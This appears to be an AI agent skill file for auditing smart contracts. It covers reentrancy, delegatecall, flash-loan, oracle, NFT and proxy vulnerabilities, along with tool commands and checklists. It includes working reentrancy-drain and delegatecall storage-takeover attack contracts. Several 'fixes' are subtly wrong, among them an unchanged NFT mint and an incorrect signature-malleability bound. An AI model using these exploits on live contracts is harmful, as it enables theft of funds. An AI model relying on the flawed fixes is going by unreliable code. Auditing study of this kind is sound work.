---
name: web3-auditor
description: Smart contract and Web3 security auditor. Covers Ethereum/EVM security (reentrancy, integer overflow/underflow, access control, front-running, delegatecall, tx.origin, arbitrary external calls), DeFi-specific vulnerabilities (flash loan attacks, price oracle manipulation, slippage, MEV, sandwich attacks, rug pulls), NFT/ERC vulnerabilities (reentrancy in ERC721, meta-transaction replay, signature malleability), Solidity anti-patterns, audit methodology, and tooling (Slither, Mythril, Echidna, Foundry). Use when: auditing smart contracts, testing DeFi protocols, hunting Web3 bugs, reviewing Solidity code, or validating on-chain exploits. Chinese trigger: 智能合约审计、Web3安全、Solidity、DeFi漏洞、以太坊、区块链安全
---

# Skill: Web3 Auditor

Complete smart contract and Web3 security auditing toolkit.

## Attack Surface Map

```
WEB3 ATTACK SURFACE:
├── Smart Contracts (Solidity, Vyper, Rust)
│   ├── Reentrancy (CEI pattern violations)
│   ├── Integer overflow/underflow
│   ├── Access control flaws
│   ├── delegatecall / call with arbitrary calldata
│   ├── tx.origin vs msg.sender
│   ├── Unchecked return values
│   ├── Front-running / MEV
│   ├── Gas limit DoS
│   └── Logic bugs in token economics
├── DeFi Protocols
│   ├── Flash loan attacks
│   ├── Price oracle manipulation
│   ├── Slippage exploitation
│   ├── Sandwich attacks
│   ├── Impermanent loss exploitation
│   └── Liquidity pool manipulation
├── NFT Standards (ERC721, ERC1155)
│   ├── Reentrancy in safeTransferFrom
│   ├── Meta-transaction replay
│   ├── Signature malleability
│   └── Minting race conditions
├── Bridges / Cross-Chain
│   ├── Signature validation flaws
│   ├── Relayer bribery
│   └── Finality assumptions
└── Frontend / Infrastructure
    ├── Wallet connection phishing
    ├── Malicious contract interactions
    └── Seed phrase exposure
```

---

## Solidity Security Fundamentals

### Critical Patterns to Always Check

```solidity
// 1. REENTRANCY: External call before state update
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    (bool success, ) = msg.sender.call{value: amount}("");  // VULN: external call first
    balances[msg.sender] -= amount;  // state update AFTER
}

// FIX: Checks-Effects-Interactions pattern
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;  // state update FIRST
    (bool success, ) = msg.sender.call{value: amount}("");
}

// 2. tx.origin vs msg.sender
function transfer(address to, uint amount) public {
    require(tx.origin == owner);  // VULN: phishable
}

// FIX:
function transfer(address to, uint amount) public {
    require(msg.sender == owner);  // correct
}

// 3. delegatecall with user-controlled data
function execute(bytes memory data) public {
    target.delegatecall(data);  // VULN if target controllable
}

// 4. Unchecked return value
(bool success, ) = token.transfer(to, amount);
// VULN: ignoring success — transfer may fail silently

// FIX:
require(success, "Transfer failed");

// 5. Integer overflow/underflow (Solidity < 0.8)
uint256 balance = balances[msg.sender];
balance -= amount;  // underflow if balance < amount

// FIX: Solidity 0.8+ has built-in checks, or use SafeMath
```

---

## Reentrancy Attacks

### Single-Function Reentrancy (Most Common)

```solidity
// VULNERABLE
contract VulnerableBank {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");
        
        // VULN: external call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;  // state updated AFTER
    }
}

// ATTACK CONTRACT
contract ReentrancyAttack {
    VulnerableBank public bank;
    
    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }
    
    receive() external payable {
        // Re-enter withdraw while balance not yet zero
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
    
    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}
```

### Cross-Function Reentrancy

```solidity
// VULNERABLE: shared state between functions
contract CrossFunctionReentrancy {
    mapping(address => uint) public balances;
    bool public locked;
    
    function withdraw() public {
        require(!locked, "Reentrant");
        locked = true;
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        locked = false;  // VULN: reentrancy via other function
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

// Attack: receive() in attacker calls deposit() which calls withdraw()
// Actually: if attacker calls another function that touches balances
// while locked is false...
```

### Read-Only Reentrancy

```solidity
// VULNERABLE: state change after external call
contract ReadOnlyReentrancy {
    IUniswapV2Pair public pair;
    
    function swap() public {
        uint reserveBefore = pair.getReserves();
        // ... swap logic ...
        uint reserveAfter = pair.getReserves();
        // Uses stale reserveAfter if pair calls back here
    }
}
```

### Reentrancy Detection Checklist

- [ ] External calls (`call`, `send`, `transfer`) happen before state updates
- [ ] No reentrancy guard (`nonReentrant` modifier) on state-changing functions
- [ ] Same contract uses both `call.value` and reads state in callbacks
- [ ] External token transfers (ERC20) don't check return values
- [ ] Unchecked `.call{value:}` in withdrawal functions
- [ ] State variables modified after external calls in same function
- [ ] Functions that can be called from `receive()` or `fallback()`

---

## Integer Overflow/Underflow

### Overflow Attack

```solidity
// Solidity < 0.8 vulnerable
contract Overflow {
    mapping(address => uint8) public balances;
    
    function deposit() public payable {
        uint8 amount = uint8(msg.value);  // truncation!
        balances[msg.sender] += amount;
    }
    
    function withdraw(uint8 amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}

// Attack: deposit 256+ wei → uint8 wraps to 0
// withdraw 0 → succeeds, but attacker gets nothing (no profit)
// Better: deposit 255 wei, balance = 255, then deposit 1 wei, balance = 0 (wraps)
```

### Underflow Exploit (More Common)

```solidity
// VULNERABLE
contract Underflow {
    mapping(address => uint) public balances;
    
    function transfer(address to, uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;  // underflow if balances < amount
        balances[to] += amount;
    }
}

// Attack: transfer 1000 tokens with balance of 500
// balances[attacker] -= 1000 → underflow → MAX_UINT - 499
// attacker's balance becomes huge
```

### Detection Patterns

```bash
# Slither detection
slither . --detect integer-overflow,integer-underflow

# Manual grep
grep -rn "+=\|-\=\|\*=\|/=" --include="*.sol" | grep -v "SafeMath\|unchecked"

# Look for:
# - uint8/uint16 usage with token amounts
# - Arithmetic after external calls
# - Multiplication of user-controlled values
```

---

## Access Control Vulnerabilities

### Missing/Broken Access Control

```solidity
// VULNERABLE 1: Missing modifier
contract MissingAuth {
    address public owner;
    
    function withdraw(uint amount) public {
        // VULN: no onlyOwner check
        payable(msg.sender).transfer(amount);
    }
}

// VULNERABLE 2: tx.origin instead of msg.sender
contract Phishable {
    address public owner;
    
    function sendTo(address to, uint amount) public {
        require(tx.origin == owner);  // VULN: phishable
        payable(to).transfer(amount);
    }
}

// Attack: attacker deploys contract, tricks owner to call attacker.sendTo()
// tx.origin = owner (original transaction sender)
// msg.sender = attacker contract

// VULNERABLE 3: Predictable owner
contract BadOwner {
    address public owner;
    
    constructor() {
        owner = address(uint160(uint(keccak256(block.timestamp))));
        // VULN: predictable, attacker can compute before tx
    }
}
```

### Function Selector Clash

```solidity
contract A {
    function transfer(address to, uint amount) public;
}

contract B {
    function transfer(address to, uint amount, bytes calldata data) public;
}

// If contract B inherits A and calls super.transfer(to, amount)
// It may call the wrong function due to selector mismatch

// Detector:
// transfer(address,uint) = 0xa9059cbb
// transfer(address,uint,bytes) = 0x...
```

---

## DeFi-Specific Vulnerabilities

### Flash Loan Attacks

**What:** Borrow unlimited funds (no collateral) in one transaction, manipulate market, repay loan, keep profit.

```solidity
// Vulnerable: price depends on single DEX reserve
contract VulnerableOracle {
    IUniswapV2Pair public pair;
    
    function getPrice() public view returns (uint) {
        (uint reserve0, uint reserve1, ) = pair.getReserves();
        return reserve1 * 1e18 / reserve0;
    }
}

// FLASH LOAN ATTACK:
// 1. Borrow 1M ETH via flash loan
// 2. Swap 1M ETH → token on Uniswap (massive price impact)
// 3. getPrice() now shows inflated price
// 4. Mint collateral at inflated price
// 5. Swap token back to ETH (price returns to normal)
// 6. Repay flash loan + fee
// 7. Keep the excess collateral (profit)
```

**Detection Checklist:**
- [ ] Price oracle uses single DEX reserve (Uniswap, SushiSwap)
- [ ] Price oracle not time-weighted (TWAP)
- [ ] Liquidation logic uses spot price (not TWAP)
- [ ] Flash loan functionality exists (Aave, dYdX, Uniswap V2)
- [ ] Collateral minting/burning tied to price
- [ ] No slippage protection on price-sensitive operations

### Price Oracle Manipulation

```solidity
// VULNERABLE: Single-source oracle
contract BadOracle {
    address uniswapPair;
    
    function getPrice() public view returns (uint) {
        (uint reserve0, uint reserve1, ) = IUniswapV2Pair(uniswapPair).getReserves();
        return reserve1 * 1e18 / reserve0;
    }
}

// FIX: Time-Weighted Average Price (TWAP)
contract GoodOracle {
    uint32[] public twapInterval;  // e.g., 1800 seconds (30 min)
    
    function getTWAP() public view returns (uint) {
        // Use Uniswap V2/V3 TWAP or Chainlink oracle
    }
}

// BETTER: Chainlink price feed (off-chain aggregated)
contract ChainlinkOracle {
    AggregatorV3Interface public priceFeed;
    
    function getPrice() public view returns (uint) {
        (, int price, , , ) = priceFeed.latestRoundData();
        return uint(price);
    }
}
```

### Sandwich Attacks

```solidity
// Vulnerable: no slippage protection
contract VulnerableSwap {
    function swap(uint amountOutMin) public {
        // VULN: attacker sees pending tx, front-runs with higher gas
        // then back-runs after swap completes
        uint amountOut = uniswap.swap(amountIn);
        // No check that amountOut >= amountOutMin
    }
}

// FIX: Use slippage tolerance
function swap(uint amountOutMin) public {
    uint amountOut = uniswap.swap(amountIn);
    require(amountOut >= amountOutMin, "Slippage exceeded");
}
```

### Impermanent Loss Exploitation

```solidity
// Attacker exploits impermanent loss calculations:
// 1. Add liquidity when prices are equal
// 2. Price moves drastically
// 3. Remove liquidity during high impermanent loss
// 4. Protocol compensates impermanent loss unfairly
// → Attacker profits from the compensation mechanism
```

---

## NFT-Specific Vulnerabilities

### ERC721 Reentrancy

```solidity
// VULNERABLE: transfer before balance update
contract VulnerableNFT is ERC721 {
    function mint(uint tokenId) public {
        _mint(msg.sender, tokenId);
        // External call in hook
        IERC721Receiver(msg.sender).onERC721Received(...);  // VULN: reentrancy
    }
    
    function transfer(address to, uint tokenId) public {
        // VULN: external call before state update
        IERC721Receiver(to).onERC721Received(msg.sender, to, tokenId, "");
        _transfer(msg.sender, to, tokenId);
    }
}

// FIX: CEI pattern
contract SafeNFT is ERC721 {
    function mint(uint tokenId) public {
        _mint(msg.sender, tokenId);  // state first
        IERC721Receiver(msg.sender).onERC721Received(...);  // external after
    }
}
```

### Meta-Transaction Replay

```solidity
// VULNERABLE: no nonce or chain ID in signature
contract MetaTxVuln {
    function execute(address to, uint value, bytes calldata data, bytes calldata sig) external {
        bytes32 hash = keccak256(abi.encodePacked(to, value, data, msg.sender));
        address signer = recover(hash, sig);
        require(signer == owner, "Invalid signature");
        // Execute without checking nonce or chain ID
    }
}

// Attack: replay signed transaction on different chain or after nonce reuse

// FIX:
bytes32 hash = keccak256(abi.encodePacked(
    to, value, data, msg.sender,
    nonce,  // incrementing nonce per signer
    block.chainid  // chain ID prevents cross-chain replay
));
```

### Minting Race Condition

```solidity
// VULNERABLE: no commit-reveal for NFT minting
contract MintRace {
    uint public mintPrice = 1 ether;
    uint public totalSupply = 10000;
    uint public minted;
    
    function mint() public payable {
        require(msg.value >= mintPrice);
        require(minted < totalSupply);
        minted++;
        _safeMint(msg.sender, minted);
    }
}

// Attack: front-run with high gas to grab limited supply
// FIX: Use Merkle tree allowlist or commit-reveal scheme
```

---

## Common DeFi Vulnerabilities

### 1. Impermanent Loss Exploitation
Attacker adds/removes liquidity at moments maximizing IL compensation payout.

### 2. Slippage Exploitation
```solidity
// VULNERABLE: no minimum output check
function swap(address tokenIn, address tokenOut, uint amountIn) public {
    uint amountOut = uniswap.exactInputSingle(...);
    // VULN: no require(amountOut >= minimum)
    // Attacker front-runs with large swap to move price
}

// FIX:
function swap(uint amountOutMin, ...) public {
    uint amountOut = uniswap.exactInputSingle(...);
    require(amountOut >= amountOutMin, "Slippage");
}
```

### 3. Liquidity Draining
```solidity
// VULNERABLE: fee-on-transfer token handling
contract BadLP {
    function addLiquidity(uint amount0, uint amount1) public {
        _transferFrom(token0, msg.sender, address(this), amount0);
        _transferFrom(token1, msg.sender, address(this), amount1);
        // VULN: fee-on-transfer tokens send less than amount0/amount1
        // LP tokens minted based on expected amounts
        // Creates imbalance exploitable for draining
    }
}
```

### 4. Sandwich Attack Vector
```solidity
// Vulnerable DEX
contract VulnerableDEX {
    function swap(uint amountIn, uint amountOutMin) public {
        // Attacker sees this in mempool
        // Front-runs with buy, moves price up
        // Victim's tx executes at bad price
        // Attacker back-runs with sell, profits
    }
}

// Mitigation: Use Uniswap V3 concentrated liquidity, slippage checks, private mempools
```

---

## Smart Contract Audit Methodology

### Phase 1: Reconnaissance
```
1. Read documentation (whitepaper, docs, architecture)
2. Understand the protocol's business logic
3. Identify core functions and asset flows
4. Review previous audit reports (if any)
5. Check for known issues on Immunefi, Solodit
```

### Phase 2: Automated Scanning
```bash
# Slither (static analysis)
pip3 install slither-analyzer
slither . --detect reentrancy,unchecked-lowlevel,arbitrary-send

# Mythril (symbolic execution)
pip3 install mythril
mythril analyze Contract.sol --solc-json mythril.json

# Echidna (fuzzing)
echidna-test Contract.sol --contract TestContract --config echidna.yaml

# Foundry (testing framework)
forge test --match-test testExploit
```

### Phase 3: Manual Review
```
1. Access control audit (who can call what)
2. State machine review (valid state transitions)
3. External call audit (reentrancy, return values)
4. Token standard compliance (ERC20/721/1155)
5. Economic attack vectors (flash loans, MEV)
6. Upgrade mechanism review
7. Event emission completeness
```

### Phase 4: Exploit Development
```solidity
// Write a PoC exploit contract
contract ExploitPoC {
    VulnerableProtocol public target;
    
    function attack() external payable {
        // Step-by-step exploitation
    }
    
    function cleanup() external {
        // Withdraw profits
    }
}

// Test on fork:
forge test --match-test testAttack --fork-url $MAINNET_RPC
```

---

## Solidity Anti-Patterns

### Dangerous Patterns

```solidity
// 1. delegatecall with user input
target.delegatecall(msg.data);  // NEVER do this

// 2. Using block.timestamp for randomness
let player = block.timestamp % 2;  // predictable!

// 3. block.number for time (12s per block, not precise)
uint time = block.number * 12;  // use block.timestamp

// 4. tx.origin for authorization
require(tx.origin == owner);  // use msg.sender

// 5. .transfer() / .send() (2300 gas limit)
payable(addr).transfer(amount);  // can break with contract wallets

// FIX: Use call with reentrancy guard
bool success;
(bool success, ) = payable(addr).call{value: amount}("");
require(success, "Transfer failed");

// 6. Unchecked low-level calls
(success, ) = target.call(data);
// VULN: ignores failure silently

// 7. Shadowing state variables
contract Parent {
    uint public value;
}
contract Child is Parent {
    uint public value;  // VULN: shadows parent
}

// 8. Visibility mismatch
uint public data;  // public but no getter (vuln if sensitive)
```

### Safe Patterns

```solidity
// CEI Pattern (Checks-Effects-Interactions)
function withdraw(uint amount) public nonReentrant {
    // 1. CHECKS
    require(balances[msg.sender] >= amount);
    
    // 2. EFFECTS (state changes first)
    balances[msg.sender] -= amount;
    
    // 3. INTERACTIONS (external calls last)
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}

// Pull over Push pattern
function withdraw(uint amount) public nonReentrant {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;
    pendingWithdrawals[msg.sender] += amount;
}

function claim() public nonReentrant {
    uint amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

---

## Smart Contract Audit Checklist

### General Checklist
- [ ] Reentrancy guard on all external-call functions
- [ ] CEI pattern followed (state before external calls)
- [ ] `tx.origin` not used for authorization
- [ ] All external call return values checked
- [ ] Integer overflow/underflow handled (Solidity 0.8+ or SafeMath)
- [ ] Access control correct (onlyOwner, onlyAdmin modifiers)
- [ ] No delegatecall with user-controlled data
- [ ] No `extcodesize` checks for contract detection
- [ ] Proper event emission for all state changes
- [ ] No hardcoded addresses (use immutable/constant)

### DeFi Checklist
- [ ] Flash loan attack vectors considered
- [ ] Price oracle manipulation resistant (TWAP/Chainlink)
- [ ] Slippage protection on all swaps
- [ ] No single-block price dependence
- [ ] Liquidity calculations correct (fee-on-transfer tokens)
- [ ] Sandwich attack mitigation
- [ ] MEV considerations (front-running protection)
- [ ] Liquidation logic uses TWAP, not spot price
- [ ] Interest rate model stable (no negative rates)
- [ ] Collateral ratios enforced correctly

### Token Standards Checklist

**ERC20:**
- [ ] Return value from transfer/transferFrom checked
- [ ] No infinite approve (safeApprove pattern)
- [ ] Proper event emission (Transfer, Approval)
- [ ] No fee-on-transfer without handling in LP calculations

**ERC721:**
- [ ] safeTransferFrom checks for contract recipients
- [ ] ERC721Receiver implemented correctly
- [ ] No reentrancy in mint/transfer functions
- [ ] Signature validation for meta-transactions
- [ ] Token URI not vulnerable to phishing

**ERC1155:**
- [ ] Batch transfer safe (reentrancy in batch ops)
- [ ] Operator approval limits
- [ ] URI consistency for batch IDs

### Upgrade Mechanism Checklist
- [ ] Proxy pattern correctly implemented (UUPS or Transparent)
- [ ] Initialization functions protected (no replay)
- [ ] Storage layout compatibility checked
- [ ] Admin-only upgrade function
- [ ] Timelock on upgrades (for user awareness)

---

## Audit Tools Reference

### Static Analysis
```bash
# Slither — solidity static analysis
pip3 install slither-analyzer
slither . --detect all --json slither-report.json

# Mythril — symbolic execution
pip3 install mythril
mythril analyze Contract.sol --solc-json settings.json

# Aderyn — Rust-based Solidity analyzer
cargo install aderyn
aderyn .
```

### Fuzzing
```bash
# Echidna — property-based fuzzing
pip3 install echidna
echidna-test Contract.sol --contract TestContract --config config.yaml

# Foundry fuzz tests
forge test --match-test testFuzz --fuzz-runs 10000

# Harvey (OpenZeppelin) — fuzzing with invariants
```

### Formal Verification
```bash
# Certora — formal verification
certoraRun CertoraConf.conf --msg "Run verification"

# Hevm — symbolic execution
hevm symbolic --debug

# SMTChecker (built into Solidity 0.8+)
solc Contract.sol --model-checker-engine chc --model-checker-solvers z3
```

### Testing Frameworks
```bash
# Foundry (recommended)
forge install
forge test
forge test --fork-url $RPC_URL --match-test testMainnet

# Hardhat
npx hardhat test
npx hardhat coverage

# Brownie (Python)
brownie test
```

---

## Common Vulnerability Patterns (with PoC)

### Pattern 1: Reentrancy

```solidity
// VULN
contract Vulnerable {
    mapping(address => uint) public balances;
    
    function withdraw() public {
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        balances[msg.sender] = 0;  // too late
    }
}

// PoC Exploit
contract ReentrancyExploit {
    Vulnerable public target;
    uint public stolen;
    
    constructor(address _target) {
        target = Vulnerable(_target);
    }
    
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
    
    function attack() external payable {
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}
```

### Pattern 2: Access Control Bypass

```solidity
// VULN: constructor not using initializer
contract VulnUpgrade {
    address public owner;
    
    // Missing initializer modifier!
    constructor() {
        owner = msg.sender;
    }
}

// FIX:
contract SafeUpgrade {
    address public owner;
    bool private initialized;
    
    function initialize() external {
        require(!initialized, "Already initialized");
        initialized = true;
        owner = msg.sender;
    }
}
```

### Pattern 3: Signature Malleability

```solidity
// VULN: ecrecover accepts malleable signatures
function recover(bytes32 hash, bytes memory sig) internal pure returns (address) {
    bytes32 r;
    bytes32 s;
    uint8 v;
    assembly {
        r := calldataload(0x20)
        s := calldataload(0x40)
        v := calldataload(0x60)
    }
    return ecrecover(hash, v, r, s);
}

// Attack: s value can be modified (s' = -s mod n) → different valid signature
// FIX: Check s is in lower half: require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F66681B)
```

---

## CVSS for Smart Contract Bugs

| Vulnerability | Typical CVSS | Notes |
|--------------|--------------|-------|
| Reentrancy → fund drain | 9.8 | Critical, direct theft |
| Access control → fund drain | 9.8 | Critical |
| Oracle manipulation → fund drain | 9.1 | Critical |
| Flash loan → fund drain | 9.1 | Critical |
| Integer overflow → fund drain | 9.1 | Critical |
| tx.origin phishable | 7.5 | High (requires social engineering) |
| Signature malleability | 7.5 | High |
| Gas limit DoS | 5.3 | Medium |
| Unchecked return value | 7.5 | High (if leads to loss) |
| Front-running vector | 5.3 | Medium (MEV, not direct theft) |

---

## Resources

- [Solodit](https://solodit.cyfrin.io) — 50K+ searchable audit findings
- [Immunefi](https://immunefi.com) — bug bounty platform for Web3
- [SWC Registry](https://swcregistry.io) — Smart Contract Weakness Classification
- [Ethereum Smart Contract Security Best Practices](https://consensys.github.io/smart-contract-best-practices/)
- [Rekt News](https://rekt.news) — DeFi hack analysis
- [OpenZeppelin Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts) — secure implementations
- [Foundry Book](https://book.getfoundry.sh) — Foundry testing framework
- [CryptoHack](https://cryptohack.org) — CTF challenges for crypto/Web3

---

## Audit Report Template

```
Title: [Vuln Class] in [Contract/Function] allows [attacker] to [impact]

Severity: Critical/High/Medium/Low

Summary:
[2-3 sentences describing the vulnerability]

Location:
File: Contract.sol
Function: vulnerableFunction()
Lines: 123-145

Root Cause:
[Technical explanation of why the bug exists]

Attack Scenario:
1. [Step 1]
2. [Step 2]
3. [Step 3]
4. [Result]

Impact:
[Concrete harm: fund drain, fund freeze, unauthorized mint, etc.]

Proof of Concept:
[Solidity PoC or Foundry test]

Remediation:
[Specific fix with code example]

References:
[SWC ID, similar CVEs, related findings]

---

## Advanced Smart Contract Vulnerabilities

### Delegatecall Exploitation Deep Dive

```
What delegatecall does:
- Executes code from target contract IN THE CONTEXT of calling contract
- The target code can modify the calling contract's storage
- Storage layout must match between contracts

VULNERABLE PATTERN:
contract Vault {
    address public owner;
    uint256 public balance;
    
    function execute(bytes calldata data) public {
        target.delegatecall(data);  // VULN
    }
}

// Attacker deploys:
contract Attack {
    function attack(Vault vault) public {
        // delegatecall runs this code in Vault's context
        // This modifies Vault's storage!
        assembly {
            sstore(0, caller())  // Set owner to attacker
        }
    }
}

IMPACT: Complete storage takeover of target contract
```

### Storage Collision Attack

```solidity
// Two contracts with different storage layouts
contract A {
    address public owner;        // slot 0
    uint256 public balance;       // slot 1
}

contract B {
    address public token;        // slot 0 (COLLISION!)
    uint256 public admin;         // slot 1 (COLLISION!)
}

// If A calls B via delegatecall, B's storage overwrites A's storage
// Both use slot 0 for different things → collision

// Attack:
// 1. Victim contract A has delegatecall to attacker's contract B
// 2. Attacker sets B.token = attacker_address (writes to slot 0)
// 3. Via delegatecall, this overwrites A.owner (slot 0)
// 4. Attacker becomes owner of A
```

### Signature Replay Across Chains

```solidity
// VULNERABLE: No chain ID in signature hash
contract Vuln {
    function execute(
        address to, 
        uint256 value, 
        bytes calldata data, 
        bytes calldata sig
    ) external {
        bytes32 hash = keccak256(abi.encodePacked(to, value, data, msg.sender));
        address signer = recover(hash, sig);
        require(signer == owner);
        (bool success, ) = to.call{value: value}(data);
        require(success);
    }
}

// Attack: Sign transaction on Ethereum Mainnet
// Replay on Polygon, BSC, Arbitrum → executes on all chains

// FIX:
bytes32 hash = keccak256(abi.encodePacked(
    to, value, data, msg.sender,
    block.chainid  // Include chain ID
));
```

### ERC20 Token Vulnerabilities

**1. Missing Return Value Check:**
```solidity
// VULNERABLE
contract VulnToken {
    function transfer(address to, uint amount) public {
        token.transfer(to, amount);  // VULN: doesn't check return value
    }
}

// Some tokens (USDT, BNB) don't return boolean on failure
// transfer "succeeds" but tokens aren't moved

// FIX:
(bool success, ) = token.transfer(to, amount);
require(success, "Transfer failed");
```

**2. Fee-on-Transfer Token Handling:**
```solidity
// VULNERABLE: assumes full amount transferred
contract BadLP {
    function addLiquidity(uint amount0, uint amount1) public {
        token0.transferFrom(msg.sender, address(this), amount0);
        token1.transferFrom(msg.sender, address(this), amount1);
        
        // VULN: fee-on-transfer token sends less than amount0
        // LP shares minted based on expected, not actual amounts
        // Creates permanent imbalance exploitable for draining
        
        uint balance0Before = token0.balanceOf(address(this));
        uint balance1Before = token1.balanceOf(address(this));
        
        token0.transferFrom(msg.sender, address(this), amount0);
        token1.transferFrom(msg.sender, address(this), amount1);
        
        uint balance0After = token0.balanceOf(address(this));
        uint balance1After = token1.balanceOf(address(this));
        
        // FIX: Calculate actual amounts received
        uint actual0 = balance0After - balance0Before;
        uint actual1 = balance1After - balance1Before;
    }
}
```

**3. Infinite Approval:**
```solidity
// VULNERABLE: approve(uint256.max) doesn't work with some tokens
token.approve(spender, type(uint256).max);

// FIX: Use safeApprove or set to exact amount
// Or use increaseAllowance/decreaseAllowance (ERC20 standard)
```

### ERC721 NFT Vulnerabilities

**1. Unsafe Mint:**
```solidity
// VULNERABLE: no supply cap, no access control
contract VulnNFT is ERC721 {
    function mint(uint256 tokenId) public {
        _safeMint(msg.sender, tokenId);
        // VULN: anyone can mint any token ID
        // Can overwrite existing tokens
    }
}

// Attack:
// 1. Attacker mints token ID 1 (original owner's token)
// 2. Original owner's token URI now points to attacker's metadata
// 3. Or: mint 1M tokens if no supply cap
```

**2. Metadata Manipulation:**
```solidity
// VULNERABLE: tokenURI not locked
function tokenURI(uint256 tokenId) public view returns (string memory) {
    return _tokenURIs[tokenId];  // Can be changed after mint
}

// Attack: Mint NFT, sell it, then change metadata to something offensive
// Fix: Use IPFS hash (immutable) or lock metadata after mint
```

**3. Reentrancy in safeTransferFrom:**
```solidity
// VULNERABLE
contract VulnNFT is ERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) public override {
        // VULN: external call before state update
        IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, "");
        _transfer(from, to, tokenId);  // state update AFTER
    }
}

// Attack: Attacker contract receives NFT, in onERC721Received
// calls safeTransferFrom again (reentrancy)
```

### Flash Loan Attack Patterns

**Pattern 1: Price Oracle Manipulation**
```solidity
// Vulnerable oracle using single DEX
contract VulnOracle {
    IUniswapV2Pair public pair;
    
    function getPrice() public view returns (uint) {
        (uint reserve0, uint reserve1, ) = pair.getReserves();
        return reserve1 * 1e18 / reserve0;
    }
}

// Attack:
// 1. Flash loan 1M ETH
// 2. Swap 1M ETH → TOKEN (massive price impact)
// 3. getPrice() now shows inflated price
// 4. Mint collateral at inflated price
// 5. Swap TOKEN back to ETH
// 6. Repay flash loan + fee
// 7. Profit from excess collateral
```

**Pattern 2: Liquidity Draining**
```solidity
// Vulnerable: doesn't handle fee-on-transfer tokens
contract VulnLP {
    function addLiquidity(uint amount0, uint amount1) public {
        token0.transferFrom(msg.sender, address(this), amount0);
        token1.transferFrom(msg.sender, address(this), amount1);
        
        // VULN: fee-on-transfer token sends less than expected
        // LP shares minted for expected amounts
        // Attacker withdraws with actual (lower) amounts
        // LP shares worth more than contributed
        
        uint shares = _mintShares(msg.sender, amount0, amount1);
    }
}
```

**Pattern 3: Governance Exploit**
```solidity
// Vulnerable: flash loan + governance
contract VulnGovernance {
    function propose(address target, bytes calldata data) public {
        // VULN: no minimum voting period
        // VULN: no quorum check
    }
    
    function execute(address target, bytes calldata data) public {
        // Attacker with flash loan:
        // 1. Borrow huge token amount
        // 2. Vote YES on malicious proposal
        // 3. Execute proposal (steal funds)
        // 4. Repay flash loan
        // 5. Keep stolen funds
    }
}
```

---

## Smart Contract Audit Methodology (Expanded)

### Phase 1: Reconnaissance (Day 1)

```
1. Read documentation thoroughly
   - Whitepaper
   - Technical documentation
   - Architecture diagrams
   - Tokenomics model

2. Understand the business logic
   - What does this protocol do?
   - Who are the users?
   - What assets are at risk?
   - What's the value flow?

3. Review previous audits
   - Check Immunefi for prior reports
   - Check Solodit for similar findings
   - Check GitHub for security advisories
   - Check if previous findings were fixed

4. Check for known CVEs
   - Search CVE database for related components
   - Check OpenZeppelin versions used
   - Check forvyern audit reports
```

### Phase 2: Automated Scanning (Day 1-2)

```bash
# Slither static analysis
slither . --detect all --json slither-report.json
slither . --detect reentrancy,unchecked-lowlevel,arbitrary-send,delegatecall

# Mythril symbolic execution
mythril analyze Contract.sol --solc-json settings.json --execution-timeout 60

# Echidna fuzzing (write invariants)
echidna-test Contract.sol --contract TestContract --config echidna.yaml

# Foundry tests
forge test --match-test testExploit --fork-url $MAINNET_RPC
forge test --match-test testFuzz --fuzz-runs 10000

# Aderyn (Rust-based, fast)
aderyn . --output aderyn-report.json
```

### Phase 3: Manual Review (Day 2-5)

```
Review order:
1. Access control (who can call what)
2. State machine (valid transitions)
3. External calls (reentrancy, return values)
4. Token standards (ERC20/721/1155 compliance)
5. Economic attacks (flash loans, MEV, price manipulation)
6. Upgrade mechanisms (proxy patterns)
7. Event emission (completeness for off-chain monitoring)
8. Numerical precision (overflow, underflow, rounding)
9. Time-based logic (block.timestamp usage)
10. Gas optimization (DoS via block gas limit)
```

### Phase 4: Report Writing (Day 5-6)

```
Report structure:
1. Executive summary (1 paragraph)
2. Vulnerability details (one section per finding)
   - Severity
   - Location
   - Root cause
   - Attack scenario
   - Proof of concept
   - Remediation
3. Centralization risks
4. Architecture recommendations
5. Gas optimizations (if requested)
```

---

## Advanced Audit Patterns

### Proxy Pattern Vulnerabilities

**Transparent Proxy:**
```solidity
// VULNERABLE: Storage collision between proxy and implementation
contract TransparentProxy {
    address public admin;      // slot 0
    address public implementation; // slot 1
    // ... proxy-specific storage
}

contract ImplementationV2 {
    address public owner;      // slot 0 — COLLISION!
    uint256 public data;       // slot 1 — COLLISION!
}

// Attack: V2's storage layout overwrites proxy's critical variables
```

**UUPS Proxy:**
```solidity
// VULNERABLE: Missing initializer in V2
contract ImplementationV1 {
    address public owner;
    uint256 public data;
    
    function initialize() external {
        owner = msg.sender;
    }
}

contract ImplementationV2 is ImplementationV1 {
    uint256 public newVar;  // slot 2
    
    // VULN: No initialize() function
    // If upgrade happens without init, newVar is uninitialized
    // Or worse: someone else can call initialize() on V2
